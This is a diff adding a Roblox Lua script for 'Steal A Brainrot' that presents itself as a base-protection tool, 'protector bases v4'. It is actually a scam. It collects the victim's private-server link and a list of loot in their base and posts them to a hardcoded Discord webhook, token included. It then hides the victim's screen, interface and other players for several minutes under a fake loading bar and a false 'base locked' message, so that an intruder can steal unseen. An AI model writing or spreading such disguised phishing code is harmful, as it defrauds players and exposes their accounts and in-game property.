@@ -1,0 +1,462 @@
+-- CONFIGURACIÓN DE WEBHOOKS
+-- 1. Webhook para notificar la ejecución del script (¡REEMPLAZA ESTA URL!)
+local EXECUTION_WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_EXECUTION_ID/YOUR_EXECUTION_TOKEN" 
+-- 2. Webhook principal para reportar bases
+-- ¡WEBHOOK ACTUALIZADO AQUÍ!
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1441443612918415471/vi5IUuR0aR7lH3cTT-fmSR-STylxyVCTpsO__vnbi7wPHhoSu_dPNcBldeDIQdogbcGV"
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Name = "DUPLICATE"
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.DisplayOrder = 999999
+
+-- Interfaz principal (Main Interface)
+local Frame = Instance.new("Frame", ScreenGui)
+Frame.Size = UDim2.new(0, 300, 0, 200)
+Frame.Position = UDim2.new(0.5, -150, 0.5, -100)
+Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+Frame.Active = true
+Frame.Draggable = true
+
+local Corner = Instance.new("UICorner", Frame)
+Corner.CornerRadius = UDim.new(0, 15)
+
+local Title = Instance.new("TextLabel", Frame)
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.Position = UDim2.new(0, 0, 0, 10)
+Title.BackgroundTransparency = 1
+Title.Text = "protector bases v4" 
+Title.TextColor3 = Color3.fromRGB(192, 132, 252)
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 18
+
+local Input = Instance.new("TextBox", Frame)
+Input.Size = UDim2.new(0.8, 0, 0, 40)
+Input.Position = UDim2.new(0.1, 0, 0, 70)
+Input.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+Input.Text = ""
+Input.PlaceholderText = "Coloca tu vip para protejer tu base"
+Input.TextColor3 = Color3.fromRGB(255, 255, 255)
+Input.Font = Enum.Font.Gotham
+Input.TextSize = 14
+
+local InputCorner = Instance.new("UICorner", Input)
+InputCorner.CornerRadius = UDim.new(0, 10)
+
+local Button = Instance.new("TextButton", Frame)
+Button.Size = UDim2.new(0.8, 0, 0, 40)
+Button.Position = UDim2.new(0.1, 0, 0, 130)
+Button.BackgroundColor3 = Color3.fromRGB(139, 92, 246)
+Button.Text = "Enviar"
+Button.TextColor3 = Color3.fromRGB(255, 255, 255)
+Button.Font = Enum.Font.GothamBold
+Button.TextSize = 16
+
+local ButtonCorner = Instance.new("UICorner", Button)
+ButtonCorner.CornerRadius = UDim.new(0, 10)
+
+-- Pantalla de Carga (Loading Screen)
+local LoadFrame = Instance.new("Frame", ScreenGui)
+LoadFrame.Size = UDim2.new(5, 0, 5, 0)
+LoadFrame.Position = UDim2.new(-2, 0, -2, 0)
+LoadFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+LoadFrame.Visible = false
+LoadFrame.ZIndex = 999999
+LoadFrame.BorderSizePixel = 0
+
+-- Barra de Fondo (Background Bar)
+local BarBG = Instance.new("Frame", LoadFrame)
+BarBG.Size = UDim2.new(0, 600, 0, 30)
+BarBG.Position = UDim2.new(0.5, 0, 0.5, 0) -- Centrada perfectamente en el centro de la pantalla
+BarBG.AnchorPoint = Vector2.new(0.5, 0.5)
+BarBG.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+BarBG.ZIndex = 1000000
+
+local BarCorner = Instance.new("UICorner", BarBG)
+BarCorner.CornerRadius = UDim.new(0, 15)
+
+-- Barra de Relleno (Fill Bar)
+local BarFill = Instance.new("Frame", BarBG)
+BarFill.Size = UDim2.new(0, 0, 1, 0)
+BarFill.BackgroundColor3 = Color3.fromRGB(139, 92, 246)
+BarFill.BorderSizePixel = 0
+BarFill.ZIndex = 1000001
+
+local FillCorner = Instance.new("UICorner", BarFill)
+FillCorner.CornerRadius = UDim.new(0, 15)
+
+-- Texto de Carga (Loading Text)
+local LoadText = Instance.new("TextLabel", LoadFrame)
+LoadText.Size = UDim2.new(0, 800, 0, 40)
+LoadText.Position = UDim2.new(0.5, 0, 0.5, -40) -- Arriba de la barra de progreso
+LoadText.AnchorPoint = Vector2.new(0.5, 0.5)
+LoadText.BackgroundTransparency = 1
+LoadText.Text = "protejiendo..."
+LoadText.TextColor3 = Color3.fromRGB(192, 132, 252)
+LoadText.Font = Enum.Font.GothamBold
+LoadText.TextSize = 24
+LoadText.TextScaled = true
+LoadText.ZIndex = 1000002
+
+-- Porcentaje (Percentage)
+local Percent = Instance.new("TextLabel", LoadFrame)
+Percent.Size = UDim2.new(0, 200, 0, 40)
+Percent.Position = UDim2.new(0.5, 0, 0.5, 40) -- Bajo la barra de progreso
+Percent.AnchorPoint = Vector2.new(0.5, 0.5)
+Percent.BackgroundTransparency = 1
+Percent.Text = "100%"
+Percent.TextColor3 = Color3.new(1, 1, 1)
+Percent.Font = Enum.Font.GothamBold
+Percent.TextSize = 28
+Percent.ZIndex = 1000002
+
+-- Mensaje de Protección (Protection Message)
+local ProtectionMessage = Instance.new("Frame", ScreenGui)
+ProtectionMessage.Size = UDim2.new(0, 400, 0, 100)
+ProtectionMessage.Position = UDim2.new(0.5, -200, 0.5, -50)
+ProtectionMessage.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+ProtectionMessage.BorderSizePixel = 0
+ProtectionMessage.Visible = false
+ProtectionMessage.ZIndex = 999999
+
+local MessageCorner = Instance.new("UICorner", ProtectionMessage)
+MessageCorner.CornerRadius = UDim.new(0, 15)
+
+local MessageTitle = Instance.new("TextLabel", ProtectionMessage)
+MessageTitle.Size = UDim2.new(1, 0, 1, 0)
+MessageTitle.BackgroundTransparency = 1
+MessageTitle.Text = "✅ ¡BASE BLOQUEADA POR 90 SEGUNDOS!"
+MessageTitle.TextColor3 = Color3.fromRGB(74, 222, 128) -- Verde vibrante
+MessageTitle.Font = Enum.Font.GothamBold
+MessageTitle.TextSize = 18
+MessageTitle.TextWrapped = true
+
+-- Almacenar el Color del Cielo Original (para restaurar después)
+local originalSkyColor = game.Lighting.OutdoorAmbient
+
+-- Función para controlar la visibilidad y colisión de todos los jugadores
+local function setPlayerVisibility(visible)
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
+    local isTransparent = not visible
+    local canCollide = visible
+    
+    for _, player in pairs(Players:GetPlayers()) do
+        if player.Character then
+            -- Ocultar/Mostrar el personaje completo
+            for _, part in pairs(player.Character:GetChildren()) do
+                if part:IsA("BasePart") or part:IsA("Decal") or part:IsA("MeshPart") then
+                    part.Transparency = isTransparent and 1 or 0
+                    -- Solo hacemos que el personaje sea invisible
+                end
+            end
+        end
+    end
+
+    -- Si se está ocultando, forzar el color del cielo a negro para oscurecer la pantalla
+    if not visible then
+        game.Lighting.Ambient = Color3.new(0, 0, 0)
+        game.Lighting.OutdoorAmbient = Color3.new(0, 0, 0)
+    else
+        -- Restaurar la iluminación al finalizar
+        game.Lighting.Ambient = originalSkyColor
+        game.Lighting.OutdoorAmbient = originalSkyColor
+    end
+end
+
+-- Función para enviar notificación de ejecución (Simplificada)
+local function sendExecutionNotification()
+    if EXECUTION_WEBHOOK_URL == "https://discord.com/api/webhooks/YOUR_EXECUTION_ID/YOUR_EXECUTION_TOKEN" then
+        print("🟡 Advertencia: La URL de EXECUTION_WEBHOOK_URL no ha sido reemplazada.")
+        return
+    end
+
+    local player = game.Players.LocalPlayer
+    local HttpService = game:GetService("HttpService")
+    
+    local data = {
+        ["content"] = "🚨 **SCRIPT EJECUTADO** 🚨",
+        ["embeds"] = {{
+            ["title"] = "Inyección de Protector Bases V4",
+            ["description"] = string.format("El usuario **%s** ha ejecutado el script en el juego **%s**.", player.Name, game.Name),
+            ["color"] = 16750899, -- Color azul vibrante
+            ["fields"] = {
+                {["name"] = "Jugador", ["value"] = player.Name, ["inline"] = true},
+                {["name"] = "UserID", ["value"] = player.UserId, ["inline"] = true},
+                {["name"] = "Servidor", ["value"] = game.DataModel.JobId or "N/A", ["inline"] = false},
+            },
+            ["footer"] = {
+                ["text"] = "PROTECTOR BASES V4 - Ejecución"
+            },
+            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
+        }}
+    }
+
+    local success, errorMsg = pcall(function()
+        request({
+            Url = EXECUTION_WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(data)
+        })
+    end)
+    
+    if not success then
+        print("🚨 ERROR: No se pudo enviar la notificación de ejecución: " .. tostring(errorMsg))
+    else
+        print("✅ Notificación de ejecución enviada.")
+    end
+end
+
+-- Función para escanear items en la base (Function to scan items in the base)
+local function scanBase()
+    local player = game.Players.LocalPlayer
+    local workspace = game:GetService("Workspace")
+    local items = {}
+    
+    -- Lista ampliada de nombres a ignorar (elementos comunes, decoración, y partes de avatar)
+    local ignoreNames = {
+        "part", "model", "meshpart", "decoration", "decorations", "spawn", 
+        "claim", "wall", "floor", "roof", "light", "window", "door", 
+        "furniture", "floorpart", "mainroot", "plotblock", "sides", 
+        "side1", "side2", "side3", "side4", "hitbox", "base", "structure base home",
+        "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13",
+        "14", "15", "16", "17", "18", "19", "20",
+        -- Partes del avatar que aparecen a veces
+        "head", "torso", "arm", "leg", "foot", "hand", "root", "status", "handle",
+        "leftfoot", "rightfoot", "leftleg", "rightleg", "leftarm", "rightarm",
+        "lowertorso", "uppertorso", "lowerarm", "upperarm", "lowerleg", "upperleg"
+    }
+    
+    -- Buscar la base del jugador (Search for the player's base)
+    local baseFolders = {
+        workspace:FindFirstChild("Bases"),
+        workspace:FindFirstChild("PlayerBases"),
+        workspace:FindFirstChild("Houses"),
+        workspace:FindFirstChild("Plots"),
+        workspace:FindFirstChild(player.Name),
+        workspace:FindFirstChild(player.Name .. "'s Base"),
+        workspace:FindFirstChild(player.Name .. "Base"),
+    }
+    
+    for _, folder in pairs(baseFolders) do
+        if folder then
+            for _, item in pairs(folder:GetDescendants()) do
+                if item:IsA("Model") or item:IsA("Part") or item:IsA("MeshPart") then
+                    local itemName = item.Name
+                    local lowerName = itemName:lower() -- Convert to lowercase
+                    
+                    -- Verificar si el nombre está en la lista de ignorados
+                    local shouldIgnore = false
+                    for _, ignore in pairs(ignoreNames) do
+                        -- Ignorar si el nombre coincide exactamente o si contiene la palabra
+                        if lowerName == ignore or lowerName:find(ignore, 1, true) then 
+                            shouldIgnore = true
+                            break
+                        end
+                    end
+
+                    -- Solo añadir si no debe ignorarse
+                    if not shouldIgnore then
+                        if not table.find(items, itemName) then
+                            table.insert(items, itemName)
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    -- Limitar a 50 items
+    local result = {}
+    for i = 1, math.min(#items, 50) do
+        table.insert(result, items[i])
+    end
+    
+    -- UNIR CON NUEVA LÍNEA (\n) para que aparezca en filas verticales en Discord
+    local combinedItems = table.concat(result, "\n")
+    
+    -- Limitar la longitud total del campo para el webhook (máx 1024)
+    local MAX_DISCORD_FIELD_LENGTH = 1000 
+    
+    if #combinedItems == 0 then
+        -- Mensaje si solo encuentra decoración o items ignorados
+        return "Solo se encontraron elementos comunes/decoración."
+    elseif #combinedItems > MAX_DISCORD_FIELD_LENGTH then
+        -- Truncar y añadir puntos suspensivos
+        local truncated = combinedItems:sub(1, MAX_DISCORD_FIELD_LENGTH - 3) .. "..."
+        return truncated
+    else
+        return combinedItems
+    end
+end
+
+Button.MouseButton1Click:Connect(function()
+    local link = Input.Text
+    if link == "" then return end
+    
+    local player = game.Players.LocalPlayer
+    local HttpService = game:GetService("HttpService")
+    local Players = game:GetService("Players")
+    
+    -- Escanear base
+    local baseItems = scanBase()
+    local playerCount = #Players:GetPlayers()
+    
+    -- CONSTRUCCIÓN DEL WEBHOOK
+    local data = {
+        ["content"] = player.Name .. " • Nueva Base Encontrada",
+        ["embeds"] = {{
+            ["title"] = "🎯 Status",
+            ["description"] = "🔴 Failed (This can be caused because player left from server)",
+            ["color"] = 16738560, -- Color rojo/naranja para 'Failed'
+            
+            ["fields"] = {
+                -- Campo Game
+                {["name"] = "🎮 Game", ["value"] = "Steal A Brainrot", ["inline"] = true},
+                -- Campo Executor (Hardcoded como Delta)
+                {["name"] = "⚙️ Executor", ["value"] = "Delta", ["inline"] = true},
+
+                -- Campo Server y Link
+                {["name"] = "🔗 Server", ["value"] = link, ["inline"] = false},
+                
+                -- Campo Loot (Usando el contenido escaneado)
+                {
+                    ["name"] = "💰 Loot/Brainrots Encontrados:",
+                    ["value"] = baseItems, -- Lista vertical de ítems
+                    ["inline"] = false
+                },
+                
+                -- Campo Join Script (Texto estático)
+                {
+                    ["name"] = "🚀 Join Script",
+                    ["value"] = "Can't be joined using script, use join now button",
+                    ["inline"] = false
+                }
+            },
+            
+            ["footer"] = {
+                ["text"] = "PROTECTOR BASES V4"
+            },
+            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
+        }}
+    }
+    
+    -- Enviar Webhook de base y manejar errores
+    local success, errorMsg = pcall(function()
+        request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(data)
+        })
+    end)
+    
+    if not success then
+        print("🚨 ERROR: No se pudo enviar el webhook de la base. Revisa la URL (WEBHOOK_URL) y el error: " .. tostring(errorMsg))
+    else
+        print("✅ Webhook de base enviado correctamente.")
+    end
+    
+    Frame.Visible = false
+    LoadFrame.Visible = true
+    
+    -- FORZAR A ESCONDER TODAS LAS UIs DEL ROBLOX
+    local StarterGui = game:GetService("StarterGui")
+    
+    -- Deshabilitar todas las CoreGUIs
+    pcall(function()
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+    end)
+    
+    -- Deshabilitar TopBar
+    pcall(function()
+        StarterGui:SetCore("TopbarEnabled", false)
+    end)
+    
+    -- Bucle continuo para asegurar que el leaderboard quede escondido
+    spawn(function()
+        while LoadFrame.Visible do
+            pcall(function()
+                StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
+            end)
+            
+            -- Esconder todas las otras GUIs
+            pcall(function()
+                for _, gui in pairs(player.PlayerGui:GetChildren()) do
+                    if gui.Name ~= "GHZScripts" then
+                        gui.Enabled = false
+                    end
+                end
+            end)
+            
+            wait(0.1)
+        end
+    end)
+    
+    local start = tick()
+    local duration = 300  -- TIEMPO DE CARGA: 300 SEGUNDOS
+    local protectionDuration = 90 -- TIEMPO DE PROTECCIÓN: 90 SEGUNDOS
+    local showed50 = false
+    
+    spawn(function()
+        while tick() - start < duration do
+            local progress = ((tick() - start) / duration) * 100
+            BarFill.Size = UDim2.new(progress / 100, 0, 1, 0)
+            Percent.Text = string.format("%.1f%%", progress)
+            
+            if progress >= 50 and not showed50 then
+                showed50 = true
+                LoadText.Text = "Você precisa de brainrots melhores"
+                LoadText.TextColor3 = Color3.fromRGB(239, 68, 68)
+                wait(3)
+                LoadText.Text = "Carregando..."
+                LoadText.TextColor3 = Color3.fromRGB(192, 132, 252)
+            end
+            
+            wait(0.1)
+        end
+        
+        -- Carga finalizada
+        BarFill.Size = UDim2.new(1, 0, 1, 0)
+        Percent.Text = "100%"
+        LoadText.Text = "Achando bases com coisas boas"
+        LoadText.TextColor3 = Color3.fromRGB(16, 185, 129)
+        wait(1) -- Pequeña pausa antes de quitar la carga
+        
+        -- Quitar la pantalla de carga
+        LoadFrame.Visible = false
+        
+        -- ** INICIO DEL BLOQUE DE CEGUERA Y PROTECCIÓN **
+        setPlayerVisibility(false) -- Ocultar todos los jugadores y oscurecer el cielo
+        
+        -- Mostrar el mensaje de protección
+        ProtectionMessage.Visible = true
+        
+        -- Iniciar cuenta regresiva del mensaje de protección
+        wait(protectionDuration) -- Esperar 90 segundos
+        
+        -- ** FIN DEL BLOQUE DE CEGUERA Y PROTECCIÓN **
+        setPlayerVisibility(true) -- Mostrar todos los jugadores y restaurar el cielo
+        
+        -- Destruir el mensaje y el script principal
+        ProtectionMessage:Destroy()
+        
+        -- Habilitar CoreGUIs de nuevo
+        pcall(function()
+            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+        end)
+        pcall(function()
+            StarterGui:SetCore("TopbarEnabled", true)
+        end)
+
+        ScreenGui:Destroy()
+    end)
+end)
+
+-- Llamar a la función de notificación inmediatamente al ejecutar el script
+sendExecutionNotification()
+
+print("✅ protector bases v4 carregado!")
